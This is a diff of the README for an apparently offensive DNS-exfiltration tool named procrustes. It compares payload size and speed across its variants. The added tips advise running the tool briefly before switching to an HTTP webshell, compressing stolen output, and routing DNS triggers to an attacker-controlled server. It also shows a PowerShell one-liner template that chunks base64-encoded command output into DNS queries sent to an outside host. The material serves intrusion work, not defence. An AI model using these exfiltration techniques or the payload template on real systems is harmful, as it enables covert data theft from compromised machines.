@@ -81,19 +81,25 @@ while [[ ${a[*]} != "4 4 4 4" ]];do ((i++));printf %s "$c";IFS=. read -a a < <(d
 | -------------         |:-------------:               |:-----:         |:-----:         |
 | payload size overhead (bash/powershell) [1] | 150\*NLABELS/500\*NLABELS (+CMD_LEN)          | 300/750 (+CMD_LEN)       |   250/❌  |
 | dispatcher calls #     | #output/(LABEL_SIZE*NLABELS)[2] |   1👌          |                1    |
-| speed (bash/powershell)[3]                | ✔/✔                         |  ✔/😔         | ✓/❌|
+| speed (bash/powershell)                | ✔/✔                         |  ✔/😔         | ✓/❌|
 
-[1] For the staged version, the command is fetched through DNS, so the listed size is the total payload size
+[1] For the staged version, the command is fetched through DNS, so the listed size is the total payload size as well.
 
 [2] On procroustes_chunked, the provided command gets executed multiple times on the server until all of its output is extracted. This behavior may cause problems in case that command is not idempotent (functionality or output-wise) or is time/resource intensive. 
 A workaround to avoid running into issues for the aforementioned cases is to first store the command output into a file (e.g. /tmp/file) and then read that file.
 
-[3] We can speed up the exfiltration process by having the NS properly responding to the requests received. This is especially usefull in the case of procroustes_full/powershell. The simple [DNS server](https://github.com/vp777/procrustes/blob/master/staged_files/dnsns.py) used for the staged version can do this task
+###Tips
+
+ - You probably want to use this script as little as possible, try to transition to a higher bandwidth channel the soonest possible (e.g. HTTP-webshell)
+ - In case long text output is expected, you can try compressing it first to speed up the exfil process, e.g. ./procrustes_full.sh ... -o >(gzip -d) -- 'ls -lhR / | gzip'
+ - Another possibility for big/binary files is to copy them to a path which is accessible for example through HTTP
+ - For increased exfil bandwidth, run the staged_files/dnsns.py on your name server. That way, we avoid waiting for the underlying DNS_TRIGGER to timeout before moving on to a new chunk. This is especially usefull in the case of procroustes_full/powershell where we currently have no parallelization.
+ - Ideally, you would have a domain (-h option) with an NS record pointing to a server you control (server where we run tcpdump). Nevertheless, in case the target is allowed to initiate connections to arbitrary DNS servers, this can be avoided by having the DNS trigger exclicitly using your DNS server (e.g. dig @your_server whatev.er)
 
 ### Todos
  - Create a wrapper script, that will contain variables (e.g. host=a, dns_trigger=b, dispatcher=c ...) and will translate them to procrustes commands (e.g. ./procrustes_full.sh -h a -d b -x c -- "$1")
  - ~~we could achieve constant command length by sending initially a "stager" command, which will then get our full command through DNS responses.~~ (done for bash)
- - Add stagers for sh (could be a massage of the bash stager), powershell (something similar with [this](https://github.com/no0be/DNSlivery/blob/731ace1eb35b7499cc7b95e22816a371507cbd40/dnslivery.py#L171))
+ - Add stagers for sh (could be a massage of the bash stager), powershell (something similar with [this](https://github.com/no0be/DNSlivery/blob/731ace1eb35b7499cc7b95e22816a371507cbd40/dnslivery.py#L136))
  - procroustes_full/powershell command can use some parallelization:
  ```bash
 [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((%CMD%)+(echo "`n%SIGNATURE%"))) -split '(.{1,%CHUNK_SIZE%})'|?{$_}|%{$i+=1;%DNS_TRIGGER% $('{0}{1}{2}' -f ($_ -replace '(.{1,%LABEL_SIZE%})','$1.'),$i,'%UNIQUE_DNS_HOST%')}
